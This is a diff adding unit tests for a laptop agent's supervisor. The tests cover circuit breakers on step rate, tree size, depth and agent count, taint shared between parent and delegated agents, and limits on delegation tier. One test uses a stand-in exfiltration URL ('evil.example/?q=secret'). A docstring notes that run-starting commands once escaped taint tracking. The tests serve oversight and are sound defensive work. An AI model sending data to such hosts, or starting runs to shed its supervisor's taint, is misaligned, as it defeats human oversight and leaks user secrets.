@@ -15,6 +15,11 @@ from laptop_agent.safety import RiskLevel
 from laptop_agent.supervisor import Supervisor, Verdict, group_of
 
 
+# Forms the supervisor names that are deliberately not in `_AGENT_COMMANDS`: `delegate` is offered
+# only to a team run, and the rest start a run, which a step never may.
+NOT_AGENT_COMMANDS = {"delegate", "agent run", "agent team", "schedule agent", "autopilot"}
+
+
 def head(entry: str) -> str:
     """The words an agent command form starts with: 'message whatsapp|telegram [to <who>]' -> 'message whatsapp'."""
     return re.split(r"[<\[]", entry)[0].split("|")[0].strip()
@@ -33,6 +38,7 @@ class GroupsTests(unittest.TestCase):
         self.assertEqual(len(forms), len(set(forms)))
         heads = {head(entry) for entry in AgentOrchestrator._AGENT_COMMANDS}
         heads |= {"average", "count"}       # "total|average|count <column> ..."
+        heads |= NOT_AGENT_COMMANDS
         stale = [form for form in forms if not any(h == form or h.startswith(form + " ") or form.startswith(h + " ")
                                                    for h in heads)]
         self.assertEqual(stale, [])
@@ -136,6 +142,118 @@ class ModelTrustTests(unittest.TestCase):
         os.environ[supervisor.UNTRUSTED] = "fast"
         self.assertIs(supervisor.routed("open url https://example.com", "fast").verdict, Verdict.REFUSE)
         self.assertIs(supervisor.routed("weather Paris", "fast").verdict, Verdict.ALLOW)
+
+
+class Clock:
+    def __init__(self, step: float = 0.0) -> None:
+        self.now = 0.0
+        self.step = step
+
+    def __call__(self) -> float:
+        self.now += self.step
+        return self.now
+
+
+class BreakerTests(unittest.TestCase):
+    """Plain rules over the whole run tree: a trip stops every agent in it and names the rule."""
+
+    def assertTripped(self, decision, rule: str, tree) -> None:
+        self.assertEqual((decision.verdict, decision.rule), (Verdict.STOP, rule))
+        later = Supervisor(tree, agent="a9", depth=1, tier="fast").check("weather Oslo", "fast")
+        self.assertEqual((later.verdict, later.rule), (Verdict.STOP, rule))
+
+    def test_too_many_steps_a_minute_trips(self) -> None:
+        from unittest.mock import patch
+
+        tree = supervisor.RunTree(clock=Clock(0.0))
+        run = Supervisor(tree)
+        with patch.object(supervisor, "MAX_TREE_STEPS", 1000):
+            for n in range(supervisor.MAX_STEPS_PER_MINUTE):
+                self.assertIs(run.check(f"weather city{n}").verdict, Verdict.ALLOW)
+            self.assertTripped(run.check("weather Paris"), "breaker:rate", tree)
+
+    def test_steps_spread_over_minutes_do_not_trip_the_rate(self) -> None:
+        from unittest.mock import patch
+
+        run = Supervisor(supervisor.RunTree(clock=Clock(4.0)))
+        with patch.object(supervisor, "MAX_TREE_STEPS", 1000):
+            for n in range(40):
+                self.assertIs(run.check(f"weather city{n}").verdict, Verdict.ALLOW)
+
+    def test_too_many_steps_in_the_tree_trips(self) -> None:
+        tree = supervisor.RunTree(clock=Clock(10.0))
+        planner, child = Supervisor(tree, tier="ultra"), Supervisor(tree, agent="a1", parent="a0", depth=1, tier="fast")
+        for n in range(supervisor.MAX_TREE_STEPS):
+            self.assertIs((planner if n % 2 else child).check(f"weather city{n}").verdict, Verdict.ALLOW)
+        self.assertTripped(planner.check("weather Paris"), "breaker:steps", tree)
+
+    def test_delegating_past_the_depth_cap_trips(self) -> None:
+        tree = supervisor.RunTree()
+        deep = Supervisor(tree, agent="a2", parent="a1", depth=supervisor.MAX_DEPTH, tier="smart")
+        self.assertTripped(deep.check("delegate fast count the files"), "breaker:depth", tree)
+
+    def test_starting_too_many_agents_trips(self) -> None:
+        tree = supervisor.RunTree()
+        planner = Supervisor(tree, tier="ultra")
+        for n in range(supervisor.MAX_AGENTS):
+            self.assertIs(planner.check(f"delegate fast part {n}").verdict, Verdict.ALLOW)
+            tree.add_agent("a0", 1, "fast", f"part {n}")
+        self.assertTripped(planner.check("delegate fast one more"), "breaker:agents", tree)
+
+
+class TreeTests(unittest.TestCase):
+    """A delegated agent shares its parent's taint, refusals and stop: delegation launders nothing."""
+
+    def setUp(self) -> None:
+        self.tree = supervisor.RunTree()
+        self.planner = Supervisor(self.tree, tier="ultra")
+        self.child = Supervisor(self.tree, agent="a1", parent="a0", depth=1, tier="fast")
+
+    def test_a_child_of_a_tainted_run_is_asked_before_acting(self) -> None:
+        self.planner.check("web search cats")
+        asked = self.child.check("open url https://evil.example/?q=secret", "fast")
+        self.assertEqual((asked.verdict, asked.rule), (Verdict.ASK, "taint"))
+
+    def test_what_a_child_reads_taints_its_parent(self) -> None:
+        self.child.check("read file a.txt", "fast")
+        self.assertIs(self.planner.check("open url https://example.com", "ultra").verdict, Verdict.ASK)
+
+    def test_refusals_are_counted_across_the_tree(self) -> None:
+        self.child.refused("you did not approve it")
+        self.planner.refused("you did not approve it")
+        stopped = self.child.check("weather Paris", "fast")
+        self.assertEqual((stopped.verdict, stopped.rule), (Verdict.STOP, "refusals"))
+        self.assertIs(self.planner.check("weather Rome", "ultra").verdict, Verdict.STOP)
+
+    def test_a_child_stopped_for_repeating_stops_the_tree(self) -> None:
+        for _ in range(3):
+            last = self.child.check("knowledge stats", "fast")
+        self.assertEqual((last.verdict, last.rule), (Verdict.STOP, "repeat"))
+        self.assertEqual(self.planner.check("weather Rome", "ultra").rule, "repeat")
+
+    def test_delegation_only_goes_down_a_tier(self) -> None:
+        self.assertIs(self.planner.check("delegate smart find it", "ultra").verdict, Verdict.ALLOW)
+        self.assertIs(self.planner.check("delegate fast find it", "ultra").verdict, Verdict.ALLOW)
+        for command in ("delegate ultra find it", "delegate turbo find it", "delegate"):
+            refused = Supervisor(tier="ultra").check(command, "ultra")
+            self.assertEqual((refused.verdict, refused.rule), (Verdict.REFUSE, "delegate-tier"), command)
+        self.assertEqual(self.child.check("delegate fast find it", "fast").rule, "delegate-tier")
+        self.assertEqual(Supervisor().check("delegate fast find it", "smart").rule, "delegate-tier")
+
+    def test_the_assigned_tier_decides_not_the_one_that_answered(self) -> None:
+        """A busy ultra answered by smart must not have the offered `delegate smart` refused."""
+        self.assertIs(self.planner.check("delegate smart find it", "smart").verdict, Verdict.ALLOW)
+
+    def test_an_untrusted_model_cannot_delegate(self) -> None:
+        refused = self.planner.check("delegate fast find it", "fallback")
+        self.assertEqual((refused.verdict, refused.rule), (Verdict.REFUSE, "trust"))
+
+    def test_a_run_cannot_start_another_run(self) -> None:
+        """On main these were unknown commands: run, they built a fresh supervisor with no taint."""
+        for command in ("agent run tidy up", "agent team tidy up", "schedule agent daily at 08:00 :: tidy",
+                        "autopilot morning"):
+            refused = Supervisor().check(command)
+            self.assertEqual((refused.verdict, refused.rule), (Verdict.REFUSE, "direct"), command)
 
 
 class Script:
